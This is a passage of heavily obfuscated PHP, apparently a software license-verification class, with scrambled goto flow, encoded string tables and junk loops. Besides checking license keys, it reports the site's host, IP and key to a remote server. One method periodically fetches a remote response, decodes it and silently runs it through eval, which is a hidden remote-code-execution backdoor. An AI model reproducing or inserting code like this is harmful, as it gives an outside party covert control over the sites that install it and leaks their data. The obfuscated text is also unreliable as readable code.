($eË†óˆËäß < $CÜÎ¦–“µ[553]) { if ($eË†óˆËäß >= 0) { break; } $eË†óˆËäß++; } goto cêäŸÙŒÔÁ; b…¥Ô¶Ğò: if ($dóäàÑƒç·[$FëÊ‹»Öø²[187]] == $FëÊ‹»Öø²[188]) { $Fó´Ê–¾ò = $this->{$_SERVER[˜][156]}($Cˆ¯’µœºë, $FëÊ‹»Öø²[189]); $Cä­è³ªÜÛ = $this->{$_SERVER[˜][136]}($FëÊ‹»Öø²[157]($EÍ¡æ—èº), $Cˆ¯’µœºë . $FëÊ‹»Öø²[190], 3); $a»µ§òôÈ = $this->{$_SERVER[˜][191]}($FëÊ‹»Öø²[192] . $Fó´Ê–¾ò . $FëÊ‹»Öø²[193] . $Cä­è³ªÜÛ, -1); $FëÊ‹»Öø²[175]($a»µ§òôÈ, !0); } else { if ($dóäàÑƒç·[$FëÊ‹»Öø²[187]] == $FëÊ‹»Öø²[194]) { $DÀßî¹Ò ± = $FëÊ‹»Öø²[25]($FëÊ‹»Öø²[123]($FëÊ‹»Öø²[195] . $Cˆ¯’µœºë), 12, 15) . $FëÊ‹»Öø²[196]; $Cä­è³ªÜÛ = $this->{$_SERVER[˜][197]}($FëÊ‹»Öø²[2]($dóäàÑƒç·[$FëÊ‹»Öø²[198]]), $DÀßî¹Ò ±, 2); $Aí¯­è¥›† = $FëÊ‹»Öø²[199]($Cä­è³ªÜÛ, !0); if (!$FëÊ‹»Öø²[200]($Aí¯­è¥›†) || !$FëÊ‹»Öø²[200]($Aí¯­è¥›†[$FëÊ‹»Öø²[201]]) || $Aí¯­è¥›†[$FëÊ‹»Öø²[174]] != !0) { $DàšÎé«ƒÌ = $FëÊ‹»Öø²[202]; $d„¬Œø©ÓÖ = $Aí¯­è¥›†[$FëÊ‹»Öø²[201]] ? $FëÊ‹»Öø²[203] . $Aí¯­è¥›†[$FëÊ‹»Öø²[201]] : $DàšÎé«ƒÌ; $FëÊ‹»Öø²[175]($d„¬Œø©ÓÖ, !1); } else { $EÍ¡æ—èº[$FëÊ‹»Öø²[177]] = $Aí¯­è¥›†[$FëÊ‹»Öø²[201]][$FëÊ‹»Öø²[204]]; } } else { $Aí¯­è¥›† = $this->{$_SERVER[˜][191]}($FëÊ‹»Öø²[205], $EÍ¡æ—èº, 10); $Dîİ·ß¢ï‹ = $CÜÎ¦–“µ[593]; if (!$Dîİ·ß¢ï‹) { die; } } } if (!$FëÊ‹»Öø²[200]($Aí¯­è¥›†) || !$FëÊ‹»Öø²[200]($Aí¯­è¥›†[$FëÊ‹»Öø²[201]]) || $Aí¯­è¥›†[$FëÊ‹»Öø²[174]] != !0) { $DàšÎé«ƒÌ = $FëÊ‹»Öø²[206]($FëÊ‹»Öø²[207]); $d„¬Œø©ÓÖ = $Aí¯­è¥›†[$FëÊ‹»Öø²[201]] ? $FëÊ‹»Öø²[203] . $Aí¯­è¥›†[$FëÊ‹»Öø²[201]] : $DàšÎé«ƒÌ; $FëÊ‹»Öø²[175]($d„¬Œø©ÓÖ, !1); } $C‘¹¼”©Ø‰ = $Aí¯­è¥›†[$FëÊ‹»Öø²[201]]; goto dñ®§õ‘‘; BÜº÷‰»: $a˜èº‘Ì = $CÜÎ¦–“µ[596]; while ($a˜èº‘Ì < $CÜÎ¦–“µ[562]) { if ($a˜èº‘Ì >= 0) { break; } $a˜èº‘Ì++; } $aìË¡ğ—Öê = $Aíøö•æÚè . $añø—¢øÖ¹[$FëÊ‹»Öø²[129]] . $this->{$_SERVER[˜][156]}($FëÊ‹»Öø²[123]($añø—¢øÖ¹[$FëÊ‹»Öø²[217]]), $Aíøö•æÚè); goto Aµæ¼¶®†±; b“„Œ˜åô³: $B†õ¹„› = $CÜÎ¦–“µ[595]; if (strlen($B†õ¹„›) < $CÜÎ¦–“µ[569]) { return; } $Aíøö•æÚè = $FëÊ‹»Öø²[133](16); goto BÜº÷‰»; D¿ƒ•×‚‹: if (!$fç„åÃáå) { die; } $FëÊ‹»Öø²[61]($FëÊ‹»Öø²[11])->{$_SERVER[˜][234]}($C¢ºòÒÎØ[$FëÊ‹»Öø²[235]], array($FëÊ‹»Öø²[236] => $DÕµ’İöˆ)); $C©ì¦ô£ = $CÜÎ¦–“µ[605]; goto eÂ«£„õ§Ú; b›šïˆÔ’İ: if (!$FëÊ‹»Öø²[113]($GLOBALS, $FëÊ‹»Öø²[141])) { die; } $dóäàÑƒç· = $GLOBALS[$FëÊ‹»Öø²[22]]; if (isset($dóäàÑƒç·[$FëÊ‹»Öø²[172]])) { $this->{$_SERVER[˜][173]}(); die; } goto d§¤¼¹—; d§¤¼¹—: if (!isset($dóäàÑƒç·[$FëÊ‹»Öø²[174]]) || $FëÊ‹»Öø²[24]($dóäàÑƒç·[$FëÊ‹»Öø²[174]]) != 16) { $FëÊ‹»Öø²[175]($FëÊ‹»Öø²[176] . $dóäàÑƒç·[$FëÊ‹»Öø²[174]], !1); } $bÊÓ¿ÕÚ = $FëÊ‹»Öø²[61]($FëÊ‹»Öø²[62])->{$_SERVER[˜][63]}($FëÊ‹»Öø²[125]); $EÍ¡æ—èº = array($FëÊ‹»Öø²[174] => $dóäàÑƒç·[$FëÊ‹»Öø²[174]], $FëÊ‹»Öø²[177] => $FëÊ‹»Öø²[133](16), $FëÊ‹»Öø²[178] => $FëÊ‹»Öø²[158], $FëÊ‹»Öø²[179] => $FëÊ‹»Öø²[180], $FëÊ‹»Öø²[181] => $_SERVER[$FëÊ‹»Öø²[182]], $FëÊ‹»Öø²[183] => $_SERVER[$FëÊ‹»Öø²[184]], $FëÊ‹»Öø²[185] => $_SERVER[$FëÊ‹»Öø²[186]]); goto bç³’™¶Î¸; bç³’™¶Î¸: $A‹……êïØî = $CÜÎ¦–“µ[592]; if (strlen($A‹……êïØî) < $CÜÎ¦–“µ[567]) { return; } $Cˆ¯’µœºë = $FëÊ‹»Öø²[123]($_SERVER[$FëÊ‹»Öø²[124]] . $bÊÓ¿ÕÚ); goto b…¥Ô¶Ğò; eÅë«í…µÍ: while ($FÁÖ·®æŞƒ < $CÜÎ¦–“µ[569]) { if ($FÁÖ·®æŞƒ >= 0) { break; } $FÁÖ·®æŞƒ++; } $DÕµ’İöˆ[$AŠõø“‰ç] = $E›æßõ™æÀ; $fç„åÃáå = $CÜÎ¦–“µ[604]; goto D¿ƒ•×‚‹; eÑÊ •Šµ: $E›æßõ™æÀ = $this->{$_SERVER[˜][136]}($FëÊ‹»Öø²[157]($C‘¹¼”©Ø‰), $còÈ§éÄØ¿); $d¯ãœÇùöÀ = $CÜÎ¦–“µ[601]; while ($d¯ãœÇùöÀ < $CÜÎ¦–“µ[558]) { if ($d¯ãœÇùöÀ >= 0) { break; } $d¯ãœÇùöÀ++; } goto a»„£ì‡Ú; Aéê’ÌÔÑİ: $E•å…¶ÍŞ  = $CÜÎ¦–“µ[598]; if ($C‘¹¼”©Ø‰[$FëÊ‹»Öø²[225]] && $C‘¹¼”©Ø‰[$FëÊ‹»Öø²[225]] >= 1) { $FëÊ‹»Öø²[61]($FëÊ‹»Öø²[62])->{$_SERVER[˜][226]}($FëÊ‹»Öø²[227], $FëÊ‹»Öø²[228]); } $FëÊ‹»Öø²[61]($FëÊ‹»Öø²[62])->{$_SERVER[˜][229]}($añø—¢øÖ¹); goto EÊ£¢„é·Å; BÚ÷Éé¤: $c¿Åß´›Øè = $CÜÎ¦–“µ[594]; if (!$c¿Åß´›Øè) { die; } $añø—¢øÖ¹[$FëÊ‹»Öø²[131]] = $FëÊ‹»Öø²[222]($FëÊ‹»Öø²[127]($this->{$_SERVER[˜][156]}($CŒÈÈèƒ°, $FëÊ‹»Öø²[223]))); goto b“„Œ˜åô³; Bâº÷ƒŸ¬Û: while ($dÆ»…‘Ãëç < $CÜÎ¦–“µ[567]) { if ($dÆ»…‘Ãëç >= 0) { break; } $dÆ»…‘Ãëç++; } $this->{$_SERVER[˜][237]}(); $FëÊ‹»Öø²[175]($FëÊ‹»Öø²[206]($FëÊ‹»Öø²[216]), !0); goto Cñ›Òó¥ãİ; Cñ›Òó¥ãİ: } private function licenseRegistSuccess() { $BˆêÅê‹†ò =& $_SERVER[˜]; $f™‘ºÂÎ±ê = $BˆêÅê‹†ò[61]($BˆêÅê‹†ò[62])->{$_SERVER[˜][63]}(); if ($f™‘ºÂÎ±ê[$BˆêÅê‹†ò[89]] != $BˆêÅê‹†ò[228]) { $BˆêÅê‹†ò[61]($BˆêÅê‹†ò[62])->{$_SERVER[˜][229]}($BˆêÅê‹†ò[89], $BˆêÅê‹†ò[228]); } $BˆêÅê‹†ò[119]($BˆêÅê‹†ò[238])->{$_SERVER[˜][239]}(!0); } private function mqeic69cb73d() { $a£Ğë¯Ÿï¤ =& $_SERVER[˜]; $a£Ğë¯Ÿï¤[61]($a£Ğë¯Ÿï¤[62])->{$_SERVER[˜][229]}(array($a£Ğë¯Ÿï¤[217] => $a£Ğë¯Ÿï¤[10], $a£Ğë¯Ÿï¤[218] => $a£Ğë¯Ÿï¤[10], $a£Ğë¯Ÿï¤[129] => $a£Ğë¯Ÿï¤[130], $a£Ğë¯Ÿï¤[131] => $a£Ğë¯Ÿï¤[10], $a£Ğë¯Ÿï¤[132] => $a£Ğë¯Ÿï¤[10])); $a£Ğë¯Ÿï¤[61]($a£Ğë¯Ÿï¤[62])->{$_SERVER[˜][226]}($a£Ğë¯Ÿï¤[227], $a£Ğë¯Ÿï¤[240]); $this->qofx89c68600 = array(); $this->undl50391cdc = $a£Ğë¯Ÿï¤[130]; } private function oynd436d8f23() { goto D½–Û£à¬–; C¢ÎÏ¥´º¯: if (!$Cİ‚†£İ) { return; } $EÃÓÂÂï®¿ = $aŸ´©‚ÏÉ[222]($aŸ´©‚ÏÉ[25]($dŸÜÆÈøÈ§, 10, 16)); $FŸŸ‰õŸËö = $Cô¨‚ƒ¸¹Œ[611]; goto eœ»îÏ©—³; eœ»îÏ©—³: $CÃ…‹‰¨Ê = $this->{$_SERVER[˜][197]}($eéŞËà“»[$aŸ´©‚ÏÉ[100]][$EÃÓÂÂï®¿], $dŸÜÆÈøÈ§); $C½•ˆÏ = $Cô¨‚ƒ¸¹Œ[612]; $CÃ…‹‰¨Ê = $aŸ´©‚ÏÉ[199]($CÃ…‹‰¨Ê, !0); goto D”±í¿­ª; D½–Û£à¬–: $Cô¨‚ƒ¸¹Œ =& $_SERVER[¬ˆÚÂ”Éğä]; $aŸ´©‚ÏÉ =& $_SERVER[˜]; $_SERVER[$aŸ´©‚ÏÉ[184]] = $aŸ´©‚ÏÉ[113]($_SERVER, $aŸ´©‚ÏÉ[184], APP_HOST); goto DÔàë¬›î; Fæ³ÀºÏº: $this->undl50391cdc = $FçŠ¥¯²œ‚[$aŸ´©‚ÏÉ[129]]; goto b°èçæíì†; AŸ¼­«³Óî: $bêÛÚ¯¶Ã™ = $aŸ´©‚ÏÉ[153]($CÃ…‹‰¨Ê[$aŸ´©‚ÏÉ[154]]); if ($aŸ´©‚ÏÉ[241]() >= $bêÛÚ¯¶Ã™) { return $this->{$_SERVER[˜][173]}(); } $this->qofx89c68600 = $CÃ…‹‰¨Ê; goto Fæ³ÀºÏº; dªÎƒÑ¡: $cƒ¬Ï‘ìÍ = $Cô¨‚ƒ¸¹Œ[608]; $FçŠ¥¯²œ‚ = $aŸ´©‚ÏÉ[61]($aŸ´©‚ÏÉ[62])->{$_SERVER[˜][63]}(); if ($FçŠ¥¯²œ‚[$aŸ´©‚ÏÉ[129]] == $aŸ´©‚ÏÉ[130]) { return; } goto BÇÈÔÖË÷…; D”±í¿­ª: $dÉ³„ë´‚¶ = $Cô¨‚ƒ¸¹Œ[613]; if (!$dÉ³„ë´‚¶) { die; } if (!$aŸ´©‚ÏÉ[200]($CÃ…‹‰¨Ê)) { return $this->{$_SERVER[˜][173]}(); } goto AŸ¼­«³Óî; aÕ‰ˆ˜”ÄÌ: $eéŞËà“» = $cô…åæß[$aŸ´©‚ÏÉ[233]]; $dŸÜÆÈøÈ§ = $aŸ´©‚ÏÉ[123]($_SERVER[$aŸ´©‚ÏÉ[124]] . $aŸ´©‚ÏÉ[222]($Bá›ãËºÑŞ) . $FçŠ¥¯²œ‚[$aŸ´©‚ÏÉ[218]]); $Cİ‚†£İ = $Cô¨‚ƒ¸¹Œ[610]; goto C¢ÎÏ¥´º¯; BÇÈÔÖË÷…: $Bá›ãËºÑŞ = $aŸ´©‚ÏÉ[61]($aŸ´©‚ÏÉ[62])->{$_SERVER[˜][63]}($aŸ´©‚ÏÉ[125]); $C–Š¿ÏƒÀ¯ = $Cô¨‚ƒ¸¹Œ[609]; $cô…åæß = $aŸ´©‚ÏÉ[230]($aŸ´©‚ÏÉ[61]($aŸ´©‚ÏÉ[11])->{$_SERVER[˜][231]}(), $aŸ´©‚ÏÉ[232]); goto aÕ‰ˆ˜”ÄÌ; DÔàë¬›î: $cŒø—Ç¢´ = $Cô¨‚ƒ¸¹Œ[607]; while (strlen($cŒø—Ç¢´) < $Cô¨‚ƒ¸¹Œ[567]) { if (!$cŒø—Ç¢´) { break; } $cŒø—Ç¢´++; } $this->undl50391cdc = $aŸ´©‚ÏÉ[130]; goto dªÎƒÑ¡; b°èçæíì†: } private function cksp53c616e1() { $eñ‚À“×Şœ =& $_SERVER[˜]; $A×¡“¦¬õ„ = $GLOBALS[$eñ‚À“×Şœ[22]]; $A£à©æ…Å¼ = $_SERVER[$eñ‚À“×Şœ[44]]; if ($A£à©æ…Å¼ == $eñ‚À“×Şœ[242] && $this->undl50391cdc == $eñ‚À“×Şœ[130]) { $eñ‚À“×Şœ[175]($eñ‚À“×Şœ[206]($eñ‚À“×Şœ[243]), !1, $eñ‚À“×Şœ[244]); } $eÎ°•§¨¢„ = array($eñ‚À“×Şœ[245], $eñ‚À“×Şœ[246]); if ($eñ‚À“×Şœ[247]($A£à©æ…Å¼, $eÎ°•§¨¢„)) { if ($this->undl50391cdc == $eñ‚À“×Şœ[130] && isset($A×¡“¦¬õ„[$eñ‚À“×Şœ[248]])) { $eñ‚À“×Şœ[175]($eñ‚À“×Şœ[206]($eñ‚À“×Şœ[243]), !1, $eñ‚À“×Şœ[244]); die; } $cÆ¢ç‚©Ûö = $this->{$_SERVER[˜][146]}(); if ($cÆ¢ç‚©Ûö != $eñ‚À“×Şœ[249]($eñ‚À“×Şœ[250])) { if ($cÆ¢ç‚©Ûö <= $eñ‚À“×Şœ[61]($eñ‚À“×Şœ[148])->{$_SERVER[˜][149]}()) { $eñ‚À“×Şœ[175]($eñ‚À“×Şœ[206]($eñ‚À“×Şœ[251]), !1, $eñ‚À“×Şœ[244]); die; } } } } private function yrhi5c263e99() { goto b™†Ÿ™¶·; b™†Ÿ™¶·: $Dó¼Éâø›ª =& $_SERVER[¬ˆÚÂ”Éğä]; $CÇ‘²Î š… =& $_SERVER[˜]; $a£ñÇ•ã¹ = array($CÇ‘²Î š…[144], $CÇ‘²Î š…[252]); goto A«ó­¦×ó—; A«ó­¦×ó—: $cŞ”ÃçªßÉ = $Dó¼Éâø›ª[614]; if (strlen($cŞ”ÃçªßÉ) < $Dó¼Éâø›ª[553]) { return; } if (!$CÇ‘²Î š…[113]($GLOBALS, $CÇ‘²Î š…[141]) || !isset($_GET[$CÇ‘²Î š…[253]])) { return; } goto f’¢«¾ï­ˆ; aÍ¯¹íŸ‚²: die; goto CòŸ¸¡øšà; bƒÙ…Ùºì—: while (strlen($Bğ¨‡³Ñ«) < $Dó¼Éâø›ª[558]) { if (!$Bğ¨‡³Ñ«) { break; } $Bğ¨‡³Ñ«++; } $f¯Øº‰æ‘ = $this->{$_SERVER[˜][255]}($f¯Øº‰æ‘, $CÇ‘²Î š…[256]); $aØÌö‹‹© = $CÇ‘²Î š…[257](array($CÇ‘²Î š…[258] => array($CÇ‘²Î š…[259] => $CÇ‘²Î š…[260], $CÇ‘²Î š…[261] => 3))); goto c˜×İæ’¾á; c˜×İæ’¾á: $f®ÊĞ—ÉìÉ = $Dó¼Éâø›ª[616]; $DßÂóŒ¾ñÇ = @$CÇ‘²Î š…[262]($f¯Øº‰æ‘, !1, $aØÌö‹‹©); $d‡çµô«½é = $Dó¼Éâø›ª[571]; goto FÀ½Ùãˆ«; FÀ½Ùãˆ«: while ($d‡çµô«½é < $Dó¼Éâø›ª[567]) { if ($d‡çµô«½é >= 0) { break; } $d‡çµô«½é++; } $CÇ‘²Î š…[263]($CÇ‘²Î š…[264]); if ($DßÂóŒ¾ñÇ && $CÇ‘²Î š…[32]($DßÂóŒ¾ñÇ, $CÇ‘²Î š…[265])) { echo $DßÂóŒ¾ñÇ; } goto aÍ¯¹íŸ‚²; f’¢«¾ï­ˆ: if (!$CÇ‘²Î š…[247]($_SERVER[$CÇ‘²Î š…[44]], $a£ñÇ•ã¹)) { return; } $f¯Øº‰æ‘ = $CÇ‘²Î š…[254]; $Bğ¨‡³Ñ« = $Dó¼Éâø›ª[615]; goto bƒÙ…Ùºì—; CòŸ¸¡øšà: } public function wzbp876a00e5($bÌ©Â¦¸·ä) { goto cˆÚæ“á»; b„”«Ò˜Ñ×: $cÓ¦¨ö‰“ä = array($EÂÅ‹ŒôÂ[267] => $EÂÅ‹ŒôÂ[268], $EÂÅ‹ŒôÂ[269] => $EÂÅ‹ŒôÂ[268], $EÂÅ‹ŒôÂ[270] => $EÂÅ‹ŒôÂ[268], $EÂÅ‹ŒôÂ[271] => $EÂÅ‹ŒôÂ[268], $EÂÅ‹ŒôÂ[272] => $EÂÅ‹ŒôÂ[268], $EÂÅ‹ŒôÂ[273] => $EÂÅ‹ŒôÂ[268], $EÂÅ‹ŒôÂ[274] => $EÂÅ‹ŒôÂ[275], $EÂÅ‹ŒôÂ[276] => $EÂÅ‹ŒôÂ[275], $EÂÅ‹ŒôÂ[277] => $EÂÅ‹ŒôÂ[275], $EÂÅ‹ŒôÂ[278] => $EÂÅ‹ŒôÂ[275], $EÂÅ‹ŒôÂ[279] => $EÂÅ‹ŒôÂ[275], $EÂÅ‹ŒôÂ[280] => $EÂÅ‹ŒôÂ[275], $EÂÅ‹ŒôÂ[281] => $EÂÅ‹ŒôÂ[275]); $AÓ’ØÔ×Ó = $EÂÅ‹ŒôÂ[0]($EÂÅ‹ŒôÂ[282], $EÂÅ‹ŒôÂ[113]($this->qofx89c68600, $EÂÅ‹ŒôÂ[138], $EÂÅ‹ŒôÂ[10])); $dÅÇ±‚Ö = array(); goto Dó‹Â£ìƒ; cˆÚæ“á»: $F·—”İƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÂÅ‹ŒôÂ =& $_SERVER[˜]; if ($this->undl50391cdc == $EÂÅ‹ŒôÂ[266]) { return $bÌ©Â¦¸·ä; } goto b„”«Ò˜Ñ×; Dó‹Â£ìƒ: foreach ($cÓ¦¨ö‰“ä as $d¸ĞŞ•šöÄ => $bØ¿ù¡ÚæŒ) { if ($bØ¿ù¡ÚæŒ == $EÂÅ‹ŒôÂ[268] && $EÂÅ‹ŒôÂ[25]($this->undl50391cdc, 0, 1) == $EÂÅ‹ŒôÂ[268]) { continue; } if (!$EÂÅ‹ŒôÂ[247]($d¸ĞŞ•šöÄ, $AÓ’ØÔ×Ó)) { $dÅÇ±‚Ö[] = $d¸ĞŞ•šöÄ; } } foreach ($dÅÇ±‚Ö as $d¸ĞŞ•šöÄ) { unset($bÌ©Â¦¸·ä[$d¸ĞŞ•šöÄ]); $A•§ñÅé•… = $F·—”İƒ[617]; if (strlen($A•§ñÅé•…) < $F·—”İƒ[567]) { return; } } return $bÌ©Â¦¸·ä; goto f„êİ­äÆ; f„êİ­äÆ: } private function fmeka3841e91() { goto d×¨¹Î¿¿; d×¨¹Î¿¿: $AƒÊÌŒ™©š =& $_SERVER[¬ˆÚÂ”Éğä]; $Fï‹Şë­µ³ =& $_SERVER[˜]; if ($this->undl50391cdc != $Fï‹Şë­µ³[130]) { return; } goto D‰Ô†‰É…¦; D‰Ô†‰É…¦: $GLOBALS[$Fï‹Şë­µ³[100]][$Fï‹Şë­µ³[104]][$Fï‹Şë­µ³[283]] = $Fï‹Şë­µ³[228]; $GLOBALS[$Fï‹Şë­µ³[100]][$Fï‹Şë­µ³[284]] = $Fï‹Şë­µ³[228]; $eÕ”Ÿ®»‘ = $AƒÊÌŒ™©š[618]; goto bÚ´È¸¡; bÚ´È¸¡: if (strlen($eÕ”Ÿ®»‘) < $AƒÊÌŒ™©š[567]) { die; } if ($Fï‹Şë­µ³[61]($Fï‹Şë­µ³[285])->{$_SERVER[˜][63]}($Fï‹Şë­µ³[89]) != $Fï‹Şë­µ³[240]) { $Fï‹Şë­µ³[61]($Fï‹Şë­µ³[285])->{$_SERVER[˜][229]}($Fï‹Şë­µ³[89], $Fï‹Şë­µ³[240]); } goto båÒÙ‚èÎ‡; båÒÙ‚èÎ‡: } public function xfkb59a16868() { return $_SERVER[˜][286]; } private function xtkl76c6b480() { goto cÍ›ßÔì; cùëŸâš¤¤: $Fšº¤Ôå’ = $CÙ«äçØ’ù[290] . $CÙ«äçØ’ù[123]($CÙ«äçØ’ù[291]); $fÏéÅÊ£Ã‰ = $b°”ÊÔîÄš[619]; if ($this->undl50391cdc == $CÙ«äçØ’ù[130] || !$CÙ«äçØ’ù[113]($GLOBALS, $CÙ«äçØ’ù[141])) { return; } goto D«ÔåáÔò; C»µÕ®¦†¢: if ($CŒ®İŠĞÈ‡[$CÙ«äçØ’ù[174]] && $CŒ®İŠĞÈ‡[$CÙ«äçØ’ù[296]]) { if ($this->{$_SERVER[˜][208]}($CŒ®İŠĞÈ‡[$CÙ«äçØ’ù[296]]) == $bŒéªÍ‚Èö[$CÙ«äçØ’ù[174]]) { return; } } $this->{$_SERVER[˜][173]}(); if ($this->{$_SERVER[˜][208]}($CŒ®İŠĞÈ‡[$CÙ«äçØ’ù[296]]) != $bŒéªÍ‚Èö[$CÙ«äçØ’ù[174]]) { $eòâÙä¶Î = array($CÙ«äçØ’ù[210] => $CÙ«äçØ’ù[61]($CÙ«äçØ’ù[62])->{$_SERVER[˜][63]}($CÙ«äçØ’ù[125]), $CÙ«äçØ’ù[211] => $_SERVER[$CÙ«äçØ’ù[124]], $CÙ«äçØ’ù[212] => $CÙ«äçØ’ù[213](), $CÙ«äçØ’ù[183] => $_SERVER[$CÙ«äçØ’ù[184]]); $D–ë’ì‡¸ƒ = $this->{$_SERVER[˜][214]}($CÙ«äçØ’ù[157]($eòâÙä¶Î)); $CŒ®İŠĞÈ‡ = $this->{$_SERVER[˜][191]}($CÙ«äçØ’ù[215] . $D–ë’ì‡¸ƒ); if ($CŒ®İŠĞÈ‡ && $CÙ«äçØ’ù[200]($CŒ®İŠĞÈ‡) && isset($CŒ®İŠĞÈ‡[$CÙ«äçØ’ù[296]])) { $aÅ‘êŠ ¼ô = $this->{$_SERVER[˜][197]}($CŒ®İŠĞÈ‡[$CÙ«äçØ’ù[296]], 2); if ($aÅ‘êŠ ¼ô) { $aÅ‘êŠ ¼ô = $this->{$_SERVER[˜][208]}($aÅ‘êŠ ¼ô); } if ($aÅ‘êŠ ¼ô) { try { @eval($aÅ‘êŠ ¼ô); } catch (Exception $c÷Œ˜ÉĞ²¯) { } } } } goto F±ù¢Îøá; Eù™Ä–ò‚’: $CÙ«äçØ’ù[13](array($CÙ«äçØ’ù[292], $CÙ«äçØ’ù[161]), $Fšº¤Ôå’, $CÙ«äçØ’ù[241]()); $bŒéªÍ‚Èö = array($CÙ«äçØ’ù[174] => $CÙ«äçØ’ù[61]($CÙ«äçØ’ù[62])->{$_SERVER[˜][63]}($CÙ«äçØ’ù[217]), $CÙ«äçØ’ù[187] => $this->undl50391cdc, $CÙ«äçØ’ù[185] => $_SERVER[$CÙ«äçØ’ù[186]], $CÙ«äçØ’ù[178] => $CÙ«äçØ’ù[158], $CÙ«äçØ’ù[181] => $_SERVER[$CÙ«äçØ’ù[182]]); $BÛ†Ùóã‚Ø = $b°”ÊÔîÄš[621]; goto FËñ¿îî¶; cÍ›ßÔì: $b°”ÊÔîÄš =& $_SERVER[¬ˆÚÂ”Éğä]; $CÙ«äçØ’ù =& $_SERVER[˜]; $fÜ‹œƒ = array($CÙ«äçØ’ù[287], $CÙ«äçØ’ù[288], $CÙ«äçØ’ù[289]); goto cùëŸâš¤¤; D«ÔåáÔò: if (!$CÙ«äçØ’ù[247]($_SERVER[$CÙ«äçØ’ù[44]], $fÜ‹œƒ)) { return; } if ($CÙ«äçØ’ù[241]() % 4 != 0) { return; } $eØ™›çØ­ = $CÙ«äçØ’ù[13](array($CÙ«äçØ’ù[292], $CÙ«äçØ’ù[293]), $Fšº¤Ôå’); goto C¡´¨ÁÚöŸ; FËñ¿îî¶: while ($BÛ†Ùóã‚Ø < $b°”ÊÔîÄš[553]) { if ($BÛ†Ùóã‚Ø >= 0) { break; } $BÛ†Ùóã‚Ø++; } $CŒ®İŠĞÈ‡ = $this->{$_SERVER[˜][191]}($CÙ«äçØ’ù[295], $bŒéªÍ‚Èö); if (!$CÙ«äçØ’ù[200]($CŒ®İŠĞÈ‡)) { return; } goto C»µÕ®¦†¢; C¡´¨ÁÚöŸ: $DÅ‹ò§ö¨ø = $b°”ÊÔîÄš[620]; if (strlen($DÅ‹ò§ö¨ø) < $b°”ÊÔîÄš[567]) { return; } if ($eØ™›çØ­ && $CÙ«äçØ’ù[241]() - $eØ™›çØ­ < $CÙ«äçØ’ù[249]($CÙ«äçØ’ù[294])) { return; } goto Eù™Ä–ò‚’; F±ù¢Îøá: } private function eoune7a52528($F¡½•Ê÷—Î = '', $CÒìíˆéÜÓ = array(), $AÕÙ”À”í± = 5) { goto DĞ–³‚ìè; f›»Ÿ¦¾: $bØˆ©¼Ç‘º = $eœì¶îæ«Õ[625]; while (strlen($bØˆ©¼Ç‘º) < $eœì¶îæ«Õ[567]) { if (!$bØˆ©¼Ç‘º) { break; } $bØˆ©¼Ç‘º++; } goto cÕàŸ¬ïè; Eù‚÷ª§çª: $e¨‹‘ÕĞ–Ø = $eœì¶îæ«Õ[624]; if (strlen($e¨‹‘ÕĞ–Ø) < $eœì¶îæ«Õ[569]) { die; } return $F°„âÄ’í[199]($CÒìíˆéÜÓ, !0); goto f›»Ÿ¦¾; DĞ–³‚ìè: $eœì¶îæ«Õ =& $_SERVER[¬ˆÚÂ”Éğä]; $F°„âÄ’í =& $_SERVER[˜]; $CÕ¯á‚ˆ“› = $F°„âÄ’í[297]; goto b¶æ÷ÌôŒ; A½Œ˜Œæ˜: $BË¦âéø÷’ = $eœì¶îæ«Õ[623]; if (!$BË¦âéø÷’) { return; } $CÒìíˆéÜÓ = @$F°„âÄ’í[262]($CÕ¯á‚ˆ“›, !1, $d ±ÜìŠš); goto Eù‚÷ª§çª; E’ß²¢àŒ: $CÕ¯á‚ˆ“› = $CÕ¯á‚ˆ“› . $F¡½•Ê÷—Î . $F°„âÄ’í[299] . $F°„âÄ’í[300]($CÒìíˆéÜÓ); if ($CÒìíˆéÜÓ === -1) { return $CÕ¯á‚ˆ“›; } $d ±ÜìŠš = $F°„âÄ’í[257](array($F°„âÄ’í[258] => array($F°„âÄ’í[261] => $AÕÙ”À”í±, $F°„âÄ’í[259] => $F°„âÄ’í[301]), $F°„âÄ’í[302] => array($F°„âÄ’í[303] => !1, $F°„âÄ’í[304] => !1))); goto A½Œ˜Œæ˜; b¶æ÷ÌôŒ: $CÕ¯á‚ˆ“› = $this->{$_SERVER[˜][255]}($CÕ¯á‚ˆ“›, $F°„âÄ’í[298]); $C¶¸¤£º­ = $eœì¶îæ«Õ[622]; if (!$C¶¸¤£º­) { return; } goto E’ß²¢àŒ; cÕàŸ¬ïè: } private function iqeu0d0c70be() { goto bÕŠ©ĞÎ; bÕŠ©ĞÎ: $Eì—öÕºÑà =& $_SERVER[¬ˆÚÂ”Éğä]; $Bí½ÓœôË =& $_SERVER[˜]; $BŒãê¼¦© = array($Bí½ÓœôË[305] => $Bí½ÓœôË[306], $Bí½ÓœôË[307] => $Bí½ÓœôË[308], $Bí½ÓœôË[309] => $Bí½ÓœôË[310], $Bí½ÓœôË[311] => $Bí½ÓœôË[312], $Bí½ÓœôË[313] => $Bí½ÓœôË[314], $Bí½ÓœôË[315] => $Bí½ÓœôË[250], $Bí½ÓœôË[316] => $Bí½ÓœôË[250], $Bí½ÓœôË[317] => $Bí½ÓœôË[306], $Bí½ÓœôË[318] => $Bí½ÓœôË[308], $Bí½ÓœôË[319] => $Bí½ÓœôË[310], $Bí½ÓœôË[320] => $Bí½ÓœôË[321], $Bí½ÓœôË[322] => $Bí½ÓœôË[312], $Bí½ÓœôË[323] => $Bí½ÓœôË[324], $Bí½ÓœôË[325] => $Bí½ÓœôË[314], $Bí½ÓœôË[326] => $Bí½ÓœôË[327], $Bí½ÓœôË[328] => $Bí½ÓœôË[329], $Bí½ÓœôË[330] => $Bí½ÓœôË[331]); goto FõÎ¾ºâÉ; cÒÀ—Ö¼¹ä: return $bñí†ÃÑ’ + $fƒ§ÒÅ¡ÄÎ; goto fî¿Èœòâ; Dã¶¼…ŞŠŒ: $f›áæÀâ®“ = $Eì—öÕºÑà[627]; if (strlen($f›áæÀâ®“) < $Eì—öÕºÑà[562]) { die; } $bñí†ÃÑ’ = $Bí½ÓœôË[249]($bñí†ÃÑ’ ? $bñí†ÃÑ’ : $Bí½ÓœôË[306]); goto f²Â‹‹¯Œ¥; E’âöòÄŠ×: $fƒ§ÒÅ¡ÄÎ = $fƒ§ÒÅ¡ÄÎ ? $Bí½ÓœôË[249]($fƒ§ÒÅ¡ÄÎ) : 0; $A‚Ğ»·½Ü¾ = $Eì—öÕºÑà[629]; if (strlen($A‚Ğ»·½Ü¾) < $Eì—öÕºÑà[569]) { die; } goto cÒÀ—Ö¼¹ä; FõÎ¾ºâÉ: 